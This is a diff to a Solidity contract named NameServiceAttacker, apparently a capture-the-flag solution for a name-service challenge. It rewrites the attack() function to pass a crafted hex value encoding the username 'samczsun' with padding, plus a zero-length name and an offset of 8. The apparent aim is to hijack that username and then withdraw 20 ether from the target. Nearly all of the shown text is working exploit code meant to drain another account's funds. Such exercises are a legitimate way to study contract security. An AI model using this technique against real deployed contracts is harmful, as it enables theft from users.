@@ -15,10 +15,13 @@ contract NameServiceAttacker {
 
     function attack() external payable {
         require(msg.sender == owner, "Only Owner");
-        //uint256 obfuscationDegree = bytes("samczsun").length - bytes("fakesam").length;
-        target.setUsername{value: 1 ether}(string("samczsun"), 0, [block.timestamp + 120, block.timestamp]);
 
-        // Now we should be able to withdraw the victim's balance
+        uint256[2] memory duration = [
+            0x73616d637a73756e414141414141414141414141414141414141414141414141,
+            block.timestamp
+        ];
+
+        target.setUsername{value: 1 ether}("", 8, duration);
         target.withdraw(20 ether);
     }
 
